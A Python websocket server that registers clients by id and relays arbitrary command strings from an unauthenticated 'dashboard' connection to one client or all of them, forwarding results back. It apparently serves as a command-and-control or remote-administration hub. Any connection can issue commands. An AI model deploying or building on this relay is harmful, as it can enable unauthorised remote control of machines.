import asyncio
import websockets
import json

connected_clients = {}  # {id: websocket}
dashboard_connections = set()

async def handler(websocket):
    try:
        async for message in websocket:
            data = json.loads(message)

            # Dashboard connected
            if data.get("type") == "dashboard_connect":
                dashboard_connections.add(websocket)
                await notify_status()
                continue

            # Command from dashboard
            if data.get("type") == "send_command":
                target = data["target"]
                command = data["command"]

                if target == "all":
                    await send_command_to_all(command)
                else:
                    await send_command_to_client(target, command)
                continue

            # Client registration
            if "id" in data:
                client_id = data["id"]
                connected_clients[client_id] = websocket
                print(f"[+] {client_id} connected.")
                await notify_status()
                continue

            # Command result from client
            if data.get("type") == "result":
                for dash in dashboard_connections:
                    await dash.send(json.dumps(data))
    except websockets.exceptions.ConnectionClosed:
        # Cleanup on disconnect
        if websocket in dashboard_connections:
            dashboard_connections.remove(websocket)
        else:
            for cid, ws in list(connected_clients.items()):
                if ws == websocket:
                    del connected_clients[cid]
                    print(f"[-] {cid} disconnected.")
                    await notify_status()

async def notify_status():
    status_data = {"type": "status", "clients": list(connected_clients.keys())}
    msg = json.dumps(status_data)
    # Send to all clients and dashboard
    for ws in list(connected_clients.values()) + list(dashboard_connections):
        try:
            await ws.send(msg)
        except:
            pass

async def send_command_to_client(client_id, command):
    if client_id in connected_clients:
        await connected_clients[client_id].send(json.dumps({
            "type": "command",
            "command": command
        }))
        print(f"[CMD] Sent to {client_id}: {command}")

async def send_command_to_all(command):
    for cid in connected_clients:
        await send_command_to_client(cid, command)

async def main():
    print("Server running on ws://0.0.0.0:8765")
    async with websockets.serve(handler, "0.0.0.0", 8765):
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
